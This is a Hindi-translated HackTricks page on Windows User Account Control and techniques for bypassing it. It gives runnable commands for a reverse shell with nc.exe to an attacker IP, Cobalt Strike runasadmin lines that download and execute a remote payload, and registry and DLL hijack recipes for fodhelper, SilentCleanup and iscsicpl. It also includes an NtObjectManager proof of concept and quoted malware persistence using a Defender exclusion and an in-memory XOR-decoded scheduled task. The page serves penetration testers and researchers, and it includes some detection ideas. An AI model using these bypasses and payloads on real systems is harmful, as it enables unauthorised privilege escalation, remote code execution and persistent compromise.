# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसी सुविधा है जो **elevated activities के लिए consent prompt** सक्षम करती है। Applications के अलग-अलग `integrity` levels होते हैं, और **high level** वाला program ऐसे tasks कर सकता है जो **system को संभावित रूप से compromise कर सकते हैं**। UAC सक्षम होने पर, applications और tasks हमेशा **non-administrator account के security context** में **run** होते हैं, जब तक कि कोई administrator इन applications/tasks को system पर administrator-level access के साथ run करने के लिए स्पष्ट रूप से authorize न करे। यह एक convenience feature है, जो administrators को अनपेक्षित बदलावों से बचाता है, लेकिन इसे security boundary नहीं माना जाता।<sup>[[2]](#references)</sup>

integrity levels के बारे में अधिक जानकारी:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

जब UAC लागू होता है, तो administrator user को 2 tokens दिए जाते हैं: regular actions को medium integrity पर करने के लिए एक standard user token, और admin privileges वाला एक token।

यह [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC के काम करने के तरीके पर बहुत विस्तार से चर्चा करता है और इसमें logon process, user experience और UAC architecture शामिल हैं।<sup>[[2]](#references)</sup> Administrators security policies का उपयोग करके यह configure कर सकते हैं कि उनके organization के लिए स्थानीय स्तर पर UAC कैसे काम करे (secpol.msc का उपयोग करके), या Active Directory domain environment में Group Policy Objects (GPO) के माध्यम से इसे configure और push out किया जा सकता है। विभिन्न settings पर विस्तार से [यहां](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) चर्चा की गई है। UAC के लिए 10 Group Policy settings set की जा सकती हैं। निम्नलिखित table अतिरिक्त विवरण प्रदान करती है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: built-in Administrator account के लिए Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Admin Approval Mode में administrators के लिए elevation prompt का Behavior](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (secure desktop पर non-Windows binaries के लिए consent prompt) |
| [User Account Control: standard users के लिए elevation prompt का Behavior](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (secure desktop पर credentials के लिए prompt)         |
| [User Account Control: application installations का पता लगाना और elevation के लिए prompt करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; Enterprise पर default रूप से disabled)           |
| [User Account Control: केवल signed और validated executables को elevate करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: केवल secure locations में installed UIAccess applications को elevate करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: सभी administrators को Admin Approval Mode में run करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: secure desktop का उपयोग किए बिना UIAccess applications को elevation के लिए prompt करने की अनुमति देना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: elevation के लिए prompt करते समय secure desktop पर switch करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: file और registry write failures को per-user locations पर virtualize करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows पर software install करने की policies

**local security policies** (अधिकांश systems पर "secpol.msc") default रूप से **non-admin users को software installations करने से रोकने** के लिए configured होती हैं। इसका अर्थ है कि भले ही कोई non-admin user आपके software का installer download कर सकता हो, फिर भी वह admin account के बिना उसे run नहीं कर पाएगा।

### UAC को elevation के लिए पूछने हेतु Registry Keys

बिना admin rights वाले standard user के रूप में, आप यह सुनिश्चित कर सकते हैं कि जब "standard" account कुछ actions करने का प्रयास करे, तो UAC द्वारा उससे **credentials के लिए prompt** किया जाए। इसके लिए कुछ **registry keys** को modify करना होगा, जिनके लिए आपको admin permissions चाहिए, जब तक कि कोई **UAC bypass** न हो या attacker पहले से admin के रूप में logged in न हो।

भले ही user **Administrators** group में हो, ये changes administrative actions करने के लिए user को अपने **account credentials दोबारा enter करने के लिए मजबूर** करते हैं।

**In practice, यह केवल तभी उपयोगी है जब आपके पास पहले से एक elevated token, UAC bypass, या ऐसी misconfiguration हो जो आपको इन keys को बदलने देती हो; अन्यथा registry write स्वयं blocked होता है।**

जिन registry keys और entries को आपको बदलना होगा, वे निम्नलिखित हैं (उनके default values parentheses में हैं):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

यह काम Local Security Policy tool के माध्यम से manually भी किया जा सकता है। बदलाव करने के बाद, administrative operations user से अपने credentials दोबारा enter करने के लिए prompt करती हैं।

### Note

**User Account Control security boundary नहीं है।** इसलिए standard users local privilege escalation exploit के बिना अपने accounts से बाहर निकलकर administrator rights प्राप्त नहीं कर सकते।

### किसी user से 'full computer access' मांगना
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode, high-integrity-level processes (जैसे web browsers) को low-integrity-level data (जैसे temporary Internet files folder) तक पहुंचने से रोकने के लिए integrity checks का उपयोग करता है। यह browser को low-integrity token के साथ चलाकर किया जाता है। जब browser low-integrity zone में stored data तक पहुंचने का प्रयास करता है, तो operating system process के integrity level की जांच करता है और उसी के अनुसार access की अनुमति देता है। यह feature remote code execution attacks को system पर sensitive data तक पहुंच प्राप्त करने से रोकने में मदद करता है।
- जब कोई user Windows में log on करता है, तो system एक access token बनाता है जिसमें user के privileges की list होती है। Privileges को user के rights और capabilities के combination के रूप में define किया जाता है। Token में user के credentials की list भी होती है; ये credentials user को computer और network पर resources के लिए authenticate करने हेतु उपयोग किए जाते हैं।

### Autoadminlogon

Windows को startup के समय किसी specific user को automatically log on करने के लिए configure करने हेतु **`AutoAdminLogon` registry key** set करें। यह kiosk environments या testing purposes के लिए उपयोगी है। इसे केवल secure systems पर उपयोग करें, क्योंकि इससे password registry में exposed हो जाता है।

Registry Editor या `reg add` का उपयोग करके निम्नलिखित keys set करें:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal logon behavior पर वापस जाने के लिए `AutoAdminLogon` को 0 पर set करें।

## UAC bypass

> [!TIP]
> ध्यान दें कि यदि आपके पास victim का graphical access है, तो UAC bypass straightforward है, क्योंकि UAC prompt दिखाई देने पर आप simply "Yes" पर click कर सकते हैं।

UAC bypass निम्नलिखित situation में आवश्यक होता है: **UAC activated है, आपका process medium integrity context में चल रहा है, और आपका user administrators group से संबंधित है।**

यह उल्लेख करना महत्वपूर्ण है कि यदि UAC highest security level (Always) पर है, तो इसे bypass करना अन्य levels (Default) की तुलना में **काफी कठिन** होता है।

### Fast triage from a medium-integrity shell

किसी bypass का प्रयास करने से पहले, पुष्टि करें कि आप सही scenario में हैं और host build को ज्ञात working methods से map करें:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
व्यावहारिक नोट्स:
- यदि `EnableLUA=0` है, तो आपको किसी bypass की आवश्यकता नहीं है: कोई भी admin token सीधे high integrity का अनुरोध कर सकता है।
- `ConsentPromptBehaviorAdmin=2` या `5` auto-elevate / COM-based bypasses के लिए सामान्य scenario है।
- `Always Notify` सुरक्षा स्तर बढ़ाता है, लेकिन आपको failure मान लेने के बजाय exact build का परीक्षण करना चाहिए: UACME अभी भी आधुनिक Windows builds पर कुछ `AlwaysNotify compatible` methods को track करता है।<sup>[[3]](#references)</sup>

### UAC disabled

यदि UAC पहले से disabled है (`ConsentPromptBehaviorAdmin` **`0`** है), तो आप कुछ इस तरह **admin privileges** (high integrity level) के साथ **reverse shell execute** कर सकते हैं:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **बहुत** Basic UAC "bypass" (पूर्ण file system access)

यदि आपके पास ऐसे user के साथ shell है जो Administrators group में है, तो आप SMB (file system) के माध्यम से साझा किए गए **C$** को स्थानीय रूप से एक नई disk में **mount** कर सकते हैं और आपको **file system के अंदर मौजूद हर चीज़ तक access** मिल जाएगा (यहाँ तक कि Administrator home folder तक भी)।

> [!WARNING]
> **लगता है कि यह trick अब काम नहीं कर रही है**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike techniques केवल तभी काम करेंगी जब UAC को उसके अधिकतम security level पर सेट न किया गया हो
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में भी **UAC** को **bypass** करने के लिए कई modules हैं।

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects आधुनिक builds पर एक व्यावहारिक UAC surface बने हुए हैं। `ICMLuaUtil` को UACME अभी भी वर्तमान Windows branches पर working के रूप में track करता है, और offensive tooling `CMSTPLUA` को interactive desktop process, 64-bit execution और कभी-कभी COM Elevation Moniker invoke करने से पहले PEB/process masquerading के संयोजन से लगातार adapt कर रही है।<sup>[[3]](#references)</sup>

Practical tips:
- User के **interactive session** में **64-bit** process को प्राथमिकता दें (आमतौर पर `explorer.exe` या उसका child)।
- यदि raw shell fail हो, तो naive `CreateProcess` wrapper के बजाय BOF / UACME implementation से retry करें।
- Child execution के **अलग elevated process** में होने की अपेक्षा रखें; कई BOFs वर्तमान beacon को in-place elevate नहीं करते।

### KRBUACBypass

Documentation और tool [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) में उपलब्ध हैं।

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) UAC bypass techniques का एक collection है। इसे Visual Studio या MSBuild के साथ compile करें; build कई executables बनाता है (उदाहरण के लिए, `Source\Akagi\output\x64\Debug\Akagi.exe`), इसलिए target build के लिए उपयुक्त method चुनें।<sup>[[3]](#references)</sup>\
सावधान रहें: कुछ bypass ऐसे visible programs या prompts launch करते हैं जो user को alert कर सकते हैं।<sup>[[3]](#references)</sup>

UACME में वह **build version** दी गई है, जिससे प्रत्येक technique ने working होना शुरू किया।<sup>[[3]](#references)</sup> आप अपने versions को affect करने वाली technique खोज सकते हैं:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
साथ ही, [इस](https://en.wikipedia.org/wiki/Windows_10_version_history) पेज का उपयोग करके आप build versions से Windows release `1607` प्राप्त कर सकते हैं।

एक व्यावहारिक workflow यह है कि पहले **host build को score करें**, और उसके बाद ही matching method चलाएँ:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` local build की तुलना अपने ज्ञात UAC methods से तेज़ी से करता है, जो dead PoCs को जल्दी हटाने में उपयोगी है।<sup>[[4]](#references)</sup>
- `UACME` किसी bypass को सटीक build से map करने के लिए अब भी सबसे अच्छा public catalogue है। हाल की releases में नए methods जोड़े गए हैं और मौजूदा methods को **Windows 11 25H2** के विरुद्ध फिर से test किया गया है, इसलिए यह मानने से पहले README/release notes दोबारा जाँच लें कि कोई पुराना blog post अब भी बिना बदलाव के लागू होता है।<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Trusted binary `fodhelper.exe` आधुनिक Windows पर auto-elevated है। लॉन्च होने पर यह `DelegateExecute` verb को validate किए बिना नीचे दिए गए per-user registry path को query करता है। वहाँ कोई command रखने से Medium Integrity process (user Administrators में है) UAC prompt के बिना High Integrity process spawn कर सकता है।

fodhelper द्वारा query किया गया Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell चरण (अपना payload सेट करें, फिर trigger करें)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- तब काम करता है जब current user Administrators का member हो और UAC level default/lenient हो (Always Notify with extra restrictions नहीं)।
- 64-bit Windows पर 32-bit process से 64-bit PowerShell शुरू करने के लिए `sysnative` path का उपयोग करें।
- Payload कोई भी command हो सकता है (PowerShell, cmd, या EXE path)। Stealth के लिए prompting UIs से बचें।

#### CurVer/extension hijack variant (केवल HKCU)

`fodhelper.exe` का दुरुपयोग करने वाले हाल के samples `DelegateExecute` से बचते हैं और इसके बजाय per-user `CurVer` value के माध्यम से **`ms-settings` ProgID** को redirect करते हैं। Auto-elevated binary अभी भी handler को `HKCU` के अंतर्गत resolve करता है, इसलिए keys plant करने के लिए admin token की आवश्यकता नहीं होती:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Elevated privileges प्राप्त करने के बाद, malware आमतौर पर `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` को `0` पर सेट करके **भविष्य के prompts को disable** कर देता है, फिर अतिरिक्त defense evasion करता है (जैसे, `Add-MpPreference -ExclusionPath C:\ProgramData`) और high integrity के रूप में चलने के लिए persistence को फिर से बनाता है। एक सामान्य persistence task डिस्क पर एक **XOR-encrypted PowerShell script** संग्रहीत करता है और हर घंटे उसे decode करके memory में execute करता है:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
यह variant अभी भी dropper को साफ़ कर देता है और केवल staged payloads छोड़ता है, जिससे detection **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, या ऐसे scheduled tasks की monitoring पर निर्भर रहती है जो PowerShell को in-memory decrypt करते हैं।<sup>[[5]](#references)</sup>

### `SilentCleanup` task (`HKCU\Environment\windir`) के ज़रिए UAC bypass

`SilentCleanup` `cleanmgr.exe` को highest privileges के साथ launch करता है और user environment से `%windir%` को expand करता है। यदि आप `HKCU\Environment\windir` को नियंत्रित करते हैं, तो आप उस expansion को किसी arbitrary command पर redirect कर सकते हैं और consent dialog के बिना high integrity प्राप्त कर सकते हैं।<sup>[[8]](#references)</sup> Recent builds पर भी इस method का testing करना उचित है, क्योंकि UACME इस technique को active रखता है और recent issue tracking से पता चलता है कि Windows 11 24H2 में केवल छोटे quoting adjustments की आवश्यकता हो सकती है।<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
यदि उस build पर task path को quote करता है, तो payload के अंत में quote के साथ पुनः प्रयास करें (उदाहरण के लिए `cmd.exe"`). Testing के बाद हमेशा `HKCU\Environment\windir` को साफ करें।

#### More UAC bypass

UI flows, COM objects या desktop interaction का दुरुपयोग करने वाले कई classic UAC bypasses के लिए victim के साथ एक **full interactive session** आवश्यक होता है; एक सामान्य `nc.exe` shell या **Session 0** में चल रही service अक्सर पर्याप्त नहीं होती।

आप अक्सर इसे **meterpreter** session का उपयोग करके हल कर सकते हैं। ऐसे **process** पर migrate करें जिसका **Session** value **1** के बराबर हो:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ को काम करना चाहिए)

### GUI के साथ UAC Bypass

यदि आपके पास **GUI** का access है, तो UAC prompt दिखाई देने पर आप उसे स्वीकार कर सकते हैं; वास्तव में आपको technical bypass की आवश्यकता नहीं होती। इसलिए, GUI session प्राप्त करना अक्सर UAC द्वारा जोड़ी गई practical friction को bypass करने के लिए पर्याप्त होता है।

इसके अलावा, यदि आपको ऐसा GUI session मिलता है जिसका कोई व्यक्ति उपयोग कर रहा था (संभवतः RDP के माध्यम से), तो **कुछ tools administrator के रूप में चल रहे होंगे**, जिनसे आप उदाहरण के लिए **cmd** को सीधे **as admin** **run** कर सकते हैं और UAC द्वारा दोबारा prompt नहीं किया जाएगा, जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **stealthy** हो सकता है।

### Noisy brute-force UAC bypass

यदि noise स्वीकार्य है, तो [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) जैसा tool user द्वारा स्वीकार किए जाने तक बार-बार elevation का अनुरोध कर सकता है।

### आपका अपना bypass - Basic UAC bypass methodology

यदि आप **UACME** को देखते हैं, तो आपको पता चलेगा कि **कई UAC bypasses DLL hijacking का दुरुपयोग करते हैं** (अक्सर किसी elevated binary से writable path से attacker-controlled DLL load करवाकर)। [DLL hijacking vulnerability ढूँढने का तरीका जानने के लिए इसे पढ़ें](../windows-local-privilege-escalation/dll-hijacking/index.html)।

1. ऐसा binary ढूँढें जो **autoelevate** हो (जाँचें कि execute किए जाने पर वह high integrity level में चलता है)।
2. Procmon की सहायता से ऐसे "**NAME NOT FOUND**" events ढूँढें जो **DLL Hijacking** के लिए vulnerable हो सकते हैं।
3. संभवतः आपको DLL को कुछ **protected paths** (जैसे C:\Windows\System32) के अंदर **write** करना होगा, जहाँ आपके पास writing permissions नहीं हैं। आप इसे इस प्रकार bypass कर सकते हैं:
1. **wusa.exe**: Windows 7,8 और 8.1। यह protected paths के अंदर CAB file के content को extract करने की अनुमति देता है (क्योंकि यह tool high integrity level से execute होता है)।
2. **IFileOperation**: Windows 10।
4. ऐसी **script** तैयार करें जो आपकी DLL को protected path के अंदर copy करे और vulnerable तथा autoelevated binary को execute करे।

### एक अन्य UAC bypass technique

इसमें यह देखना शामिल है कि क्या कोई **autoElevated binary** **registry** से execute किए जाने वाले किसी **binary** या **command** का **name/path** **read** करने का प्रयास करता है (यह अधिक interesting है यदि binary इस information को **HKCU** के अंदर खोजता है)।

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack के माध्यम से UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` एक **auto-elevated** binary है जिसका search order के माध्यम से `iscsiexe.dll` load करने के लिए दुरुपयोग किया जा सकता है। यदि आप किसी **user-writable** folder के अंदर malicious `iscsiexe.dll` रख सकते हैं और फिर current user `PATH` को modify कर सकते हैं (उदाहरण के लिए `HKCU\Environment\Path` के माध्यम से), ताकि उस folder को search किया जाए, तो Windows attacker DLL को elevated `iscsicpl.exe` process के अंदर **बिना UAC prompt दिखाए** load कर सकता है।<sup>[[1]](#references)[[6]](#references)</sup>

Practical notes:
- यह तब उपयोगी है जब current user **Administrators** में हो, लेकिन UAC के कारण **Medium Integrity** पर चल रहा हो।
- इस bypass के लिए **SysWOW64** वाली copy relevant है। **System32** वाली copy को एक अलग binary मानें और behavior को independently validate करें।
- यह primitive **auto-elevation** और **DLL search-order hijacking** का combination है, इसलिए अन्य UAC bypasses के लिए उपयोग किया जाने वाला ProcMon workflow missing DLL load को validate करने में उपयोगी है।

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `C:\Windows\SysWOW64\iscsicpl.exe` के execution से तुरंत पहले `HKCU\Environment\Path` में `reg add` / registry writes होने पर Alert करें।
- `%TEMP%` या `%LOCALAPPDATA%\Microsoft\WindowsApps` जैसे **user-controlled** locations में `iscsiexe.dll` के लिए Hunt करें।
- `iscsicpl.exe` launches को सामान्य Windows directories के बाहर से होने वाले unexpected child processes या DLL loads के साथ Correlate करें।

### अलग से जाँचने योग्य नया research

कुछ post-2024 chains अब classic `HKCU\Software\Classes` registry hijacks जैसी नहीं दिखतीं। उदाहरण के लिए, activation-context cache poisoning, **drive remap** और **DLL redirection** को chain करके trusted UI / auto-elevated binaries, जैसे `ctfmon.exe` और बाद के targets जैसे `fodhelper.exe`, के माध्यम से medium से high integrity तक पहुँचा जा सकता है। यहाँ बड़ा PoC दोहराने के बजाय, इन compact payload examples को देखें:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 पर पूरे `RAiLaunchAdminProcess` / UIAccess attack surface के लिए dedicated page देखें:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 का “Administrator Protection” per-session `\Sessions\0\DosDevices/<LUID>` maps के साथ shadow-admin tokens का उपयोग करता है। यह directory, पहले `\??` resolution पर `SeGetTokenDeviceMap` द्वारा lazily बनाई जाती है। यदि attacker shadow-admin token को केवल **SecurityIdentification** पर impersonate करता है, तो directory attacker को **owner** बनाकर बनाई जाती है (`CREATOR OWNER` inherit करती है), जिससे `\GLOBAL??` पर प्राथमिकता लेने वाले drive-letter links बनाए जा सकते हैं।<sup>[[7]](#references)</sup>

**चरण:**

1. Low-privileged session से, promptless shadow-admin `runonce.exe` spawn करने के लिए `RAiProcessRunOnce` call करें।
2. इसके primary token को एक **identification** token में Duplicate करें और `\??` खोलते समय उसका impersonate करें, ताकि `\Sessions\0\DosDevices/<LUID>` attacker के ownership के अंतर्गत बनाई जाए।
3. वहाँ attacker-controlled storage की ओर संकेत करने वाला `C:` symlink बनाएँ; इसके बाद उस session में होने वाले filesystem accesses `C:` को attacker path पर resolve करेंगे, जिससे बिना prompt के DLL/file hijack संभव होगा।

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control कैसे काम करता है](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass techniques का संग्रह](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass compatibility scanner और launcher](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI ने PowerShell Backdoors बनाने के लिए AI अपनाया](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Southeast Asian Government Targets के विरुद्ध 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection को bypass करना](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task का उपयोग करके Bypass UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
